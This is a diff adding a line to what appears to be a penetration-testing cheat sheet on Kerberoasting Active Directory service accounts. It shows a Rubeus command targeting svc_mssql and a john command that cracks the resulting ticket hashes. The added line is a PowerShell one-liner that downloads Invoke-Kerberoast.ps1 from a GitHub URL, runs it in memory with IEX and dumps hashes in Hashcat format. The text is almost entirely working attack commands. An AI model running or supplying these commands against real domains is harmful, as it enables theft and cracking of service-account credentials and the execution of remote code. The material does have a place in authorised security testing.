@@ -28,6 +28,8 @@ Requires AD Modules:
 ## Kerberoasting
 From Windows against single user using Rubeus.exe:   
 `.\Rubeus.exe kerberoast /user:svc_mssql /nowrap`   
+Using Invoke-Kerberoast:    
+`IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-Kerberoast -OutputFormat Hashcat`   
 
 ### Cracking
 `john --format=krb5tgs --wordlist=wordlist svc_mssql`   
